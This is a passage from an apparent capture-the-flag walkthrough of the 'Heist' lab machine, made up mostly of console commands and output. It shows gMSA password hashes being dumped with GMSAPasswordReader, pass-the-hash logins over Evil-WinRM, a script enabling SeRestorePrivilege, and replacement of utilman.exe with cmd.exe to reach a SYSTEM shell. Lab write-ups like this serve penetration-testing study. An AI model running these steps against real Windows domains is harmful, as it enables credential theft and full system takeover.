Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8002::154, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 105984 (104K) [application/octet-stream]
Saving to: ‘GMSAPasswordReader.exe’

GMSAPasswordReader.exe                          100%[====================================================================================================>] 103.50K  --.-KB/s    in 0.1s    

2022-01-27 01:13:32 (1.05 MB/s) - ‘GMSAPasswordReader.exe’ saved [105984/105984]
```

```console
Evil-WinRM* PS C:\Windows\temp> upload /opt/tools/GMSAPasswordReader.exe
Info: Uploading /opt/tools/GMSAPasswordReader.exe to C:\Windows\temp\GMSAPasswordReader.exe

                                                             
Data: 141312 bytes of 141312 bytes copied

Info: Upload successful!
```

```console
*Evil-WinRM* PS C:\Windows\temp> ./GMSAPasswordReader.exe --accountname svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : DEB6F85CF5EAE0951DD89F4AFD884AE5
[*]       aes128_cts_hmac_sha1 : C5A97007F3CA002059FD8A98962760D0
[*]       aes256_cts_hmac_sha1 : 0DA099CCCBE0C0D6F5EB06E465B7CF05FF069E5E625DD10DA009CA9A795E6E8F
[*]       des_cbc_md5          : 9E340723700454E9

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 78BC82C952449150A12AD60E870A2BE4
[*]       aes128_cts_hmac_sha1 : E5256E911BDDF020B9DAC64EE0CEB26E
[*]       aes256_cts_hmac_sha1 : 2F246BFA5CF1E2BCCC91A280EF0E02B6BE4C5AD8000F0A05F8B95E632ACBB339
[*]       des_cbc_md5          : 839E5E52A7029D8F
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# evil-winrm -i 192.168.102.165 -u svc_apache$ -H 78BC82C952449150A12AD60E870A2BE4

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami
heist\svc_apache$
```

```console
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> 
```

```console
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload /opt/tools/EnableSeRestorePrivilege.ps1
Info: Uploading /opt/tools/EnableSeRestorePrivilege.ps1 to C:\Users\svc_apache$\Documents\EnableSeRestorePrivilege.ps1

*Evil-WinRM* PS C:\Users\svc_apache$\Documents> .\EnableSeRestorePrivilege.ps1
Debug:
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct TokPriv1Luid
        {
                public int Count;
                public long Luid;
                public int Attr;
        }

        public static class Advapi32
        {
                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool OpenProcessToken(
                        IntPtr ProcessHandle,
                        int DesiredAccess,
                        ref IntPtr TokenHandle);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool LookupPrivilegeValue(
                        string lpSystemName,
                        string lpName,
                        ref long lpLuid);

                [DllImport("advapi32.dll", SetLastError = true)]
                public static extern bool AdjustTokenPrivileges(
                        IntPtr TokenHandle,
                        bool DisableAllPrivileges,
                        ref TokPriv1Luid NewState,
                        int BufferLength,
                        IntPtr PreviousState,
                        IntPtr ReturnLength);

        }

        public static class Kernel32
        {
                [DllImport("kernel32.dll")]
                public static extern uint GetLastError();
        }
Debug: Current process handle: 2964
Debug: Calling OpenProcessToken()
Debug: Token handle: 1516
Debug: Calling LookupPrivilegeValue for SeRestorePrivilege
Debug: SeRestorePrivilege LUID value: 18
Debug: Calling AdjustTokenPrivileges
Debug: GetLastError returned: 0
```

```console
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> 
```

```console
┌──(root💀kali)-[/opt/tools]
└─# rdesktop 192.168.102.165          
Autoselecting keyboard map 'en-us' from locale
```

Win + U
whoami

```console
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> .\gMSA_Permissions_Collection.ps1

svc_apache IdentityReference                                                                               ActiveDirectoryRights ObjectType                           IsInherited
---------- -----------------                                                                               --------------------- ----------                           -----------
           NT AUTHORITY\SYSTEM                                                                                        GenericAll 00000000-0000-0000-0000-000000000000       False
           BUILTIN\Account Operators                                                                                  GenericAll 00000000-0000-0000-0000-000000000000       False
           HEIST\Domain Admins                                                                                        GenericAll 00000000-0000-0000-0000-000000000000       False
           HEIST\Enterprise Admins                                                                                    GenericAll 00000000-0000-0000-0000-000000000000        True
           BUILTIN\Administrators    CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner 00000000-0000-0000-0000-000000000000        True


*Evil-WinRM* PS AD:\> 
```